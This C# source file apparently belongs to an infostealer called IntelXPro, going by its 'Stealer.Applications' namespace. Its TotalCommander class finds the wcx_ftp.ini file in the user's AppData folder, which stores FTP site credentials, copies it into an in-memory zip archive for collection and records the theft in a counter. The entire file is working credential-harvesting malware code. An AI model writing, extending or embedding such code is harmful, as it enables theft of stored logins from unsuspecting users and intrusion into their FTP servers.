using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class TotalCommander : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "GHISLER", "wcx_ftp.ini");
            if (File.Exists(text))
            {
                string text2 = "Total Commander\\wcx_ftp.ini";
                zip.AddFile(text2, File.ReadAllBytes(text));
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "Total Commander";
                counterApplications.Files.Add(text + " => " + text2);
                counterApplications.Files.Add(text2);
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
